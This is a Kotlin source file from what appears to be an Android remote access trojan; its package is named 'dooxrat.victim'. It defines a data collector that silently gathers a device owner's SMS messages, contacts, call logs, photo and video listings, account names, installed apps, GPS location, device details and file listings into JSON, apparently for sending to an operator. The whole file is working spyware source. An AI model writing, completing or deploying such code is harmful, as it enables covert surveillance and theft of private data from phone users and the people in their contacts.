package com.dooxrat.victim

import android.content.ContentResolver
import android.content.Context
import android.database.Cursor
import android.net.Uri
import android.provider.ContactsContract
import android.provider.MediaStore
import android.provider.CallLog
import android.provider.Telephony
import android.location.LocationManager
import android.os.Build
import android.accounts.AccountManager
import org.json.JSONArray
import org.json.JSONObject
import java.io.File

class DataCollector(private val context: Context) {

    fun getSMS(): JSONArray {
        val result = JSONArray()
        try {
            val uri = Telephony.Sms.CONTENT_URI
            val cursor = context.contentResolver.query(uri, null, null, null, null)
            cursor?.use {
                while (it.moveToNext()) {
                    val obj = JSONObject().apply {
                        put("address", it.getString(it.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)))
                        put("body", it.getString(it.getColumnIndexOrThrow(Telephony.Sms.BODY)))
                        put("date", it.getLong(it.getColumnIndexOrThrow(Telephony.Sms.DATE)))
                        put("type", it.getInt(it.getColumnIndexOrThrow(Telephony.Sms.TYPE)))
                    }
                    result.put(obj)
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
        return result
    }

    fun getContacts(): JSONArray {
        val result = JSONArray()
        try {
            val cursor = context.contentResolver.query(
                ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null
            )
            cursor?.use {
                while (it.moveToNext()) {
                    val id = it.getString(it.getColumnIndexOrThrow(ContactsContract.Contacts._ID))
                    val name = it.getString(it.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME))
                    
                    val phoneCursor = context.contentResolver.query(
                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        null,
                        ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                        arrayOf(id), null
                    )
                    
                    phoneCursor?.use { pc ->
                        while (pc.moveToNext()) {
                            val obj = JSONObject().apply {
                                put("name", name)
                                put("phone", pc.getString(pc.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)))
                            }
                            result.put(obj)
                        }
                    }
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
        return result
    }

    fun getCallLogs(): JSONArray {
        val result = JSONArray()
        try {
            val cursor = context.contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                null, null, null,
                CallLog.Calls.DATE + " DESC"
            )
            cursor?.use {
                while (it.moveToNext()) {
                    val obj = JSONObject().apply {
                        put("number", it.getString(it.getColumnIndexOrThrow(CallLog.Calls.NUMBER)))
                        put("type", it.getInt(it.getColumnIndexOrThrow(CallLog.Calls.TYPE)))
                        put("date", it.getLong(it.getColumnIndexOrThrow(CallLog.Calls.DATE)))
                        put("duration", it.getInt(it.getColumnIndexOrThrow(CallLog.Calls.DURATION)))
                    }
                    result.put(obj)
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
        return result
    }

    fun getGalleryPhotos(): JSONArray {
        val result = JSONArray()
        try {
            val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
            val projection = arrayOf(
                MediaStore.Images.Media._ID,
                MediaStore.Images.Media.DISPLAY_NAME,
                MediaStore.Images.Media.DATA,
                MediaStore.Images.Media.SIZE,
                MediaStore.Images.Media.DATE_TAKEN
            )
            
            val cursor = context.contentResolver.query(
                uri, projection, null, null,
                MediaStore.Images.Media.DATE_TAKEN + " DESC"
            )
            
            cursor?.use {
                while (it.moveToNext()) {
                    val obj = JSONObject().apply {
                        put("id", it.getString(0))
                        put("name", it.getString(1))
                        put("path", it.getString(2))
                        put("size", it.getLong(3))
                        put("date", it.getLong(4))
                    }
                    result.put(obj)
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
        return result
    }

    fun getGalleryVideos(): JSONArray {
        val result = JSONArray()
        try {
            val uri = MediaStore.Video.Media.EXTERNAL_CONTENT_URI
            val projection = arrayOf(
                MediaStore.Video.Media._ID,
                MediaStore.Video.Media.DISPLAY_NAME,
                MediaStore.Video.Media.DATA,
                MediaStore.Video.Media.SIZE,
                MediaStore.Video.Media.DURATION,
                MediaStore.Video.Media.DATE_TAKEN
            )
            
            val cursor = context.contentResolver.query(
                uri, projection, null, null,
                MediaStore.Video.Media.DATE_TAKEN + " DESC"
            )
            
            cursor?.use {
                while (it.moveToNext()) {
                    val obj = JSONObject().apply {
                        put("id", it.getString(0))
                        put("name", it.getString(1))
                        put("path", it.getString(2))
                        put("size", it.getLong(3))
                        put("duration", it.getLong(4))
                        put("date", it.getLong(5))
                    }
                    result.put(obj)
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
        return result
    }

    fun getEmailAccounts(): JSONArray {
        val result = JSONArray()
        try {
            val accountManager = AccountManager.get(context)
            val accounts = accountManager.accounts
            
            for (account in accounts) {
                val obj = JSONObject().apply {
                    put("name", account.name)
                    put("type", account.type)
                }
                result.put(obj)
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
        return result
    }

    fun getInstalledApps(): JSONArray {
        val result = JSONArray()
        try {
            val pm = context.packageManager
            val packages = pm.getInstalledApplications(0)
            
            for (packageInfo in packages) {
                val obj = JSONObject().apply {
                    put("name", pm.getApplicationLabel(packageInfo).toString())
                    put("package", packageInfo.packageName)
                }
                result.put(obj)
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
        return result
    }

    fun getLocation(): JSONObject? {
        try {
            val locationManager = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
            val location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
                ?: locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
            
            if (location != null) {
                return JSONObject().apply {
                    put("lat", location.latitude)
                    put("lng", location.longitude)
                    put("accuracy", location.accuracy)
                    put("time", location.time)
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
        return null
    }

    fun getDeviceInfo(): JSONObject {
        return JSONObject().apply {
            put("model", Build.MODEL)
            put("manufacturer", Build.MANUFACTURER)
            put("brand", Build.BRAND)
            put("device", Build.DEVICE)
            put("androidVersion", Build.VERSION.RELEASE)
            put("sdkVersion", Build.VERSION.SDK_INT)
            put("board", Build.BOARD)
            put("hardware", Build.HARDWARE)
        }
    }

    fun getFilesList(path: String): JSONArray {
        val result = JSONArray()
        try {
            val directory = File(path)
            if (directory.exists() && directory.isDirectory) {
                directory.listFiles()?.forEach { file ->
                    val obj = JSONObject().apply {
                        put("name", file.name)
                        put("path", file.absolutePath)
                        put("size", file.length())
                        put("isDirectory", file.isDirectory)
                        put("lastModified", file.lastModified())
                    }
                    result.put(obj)
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
        return result
    }
}
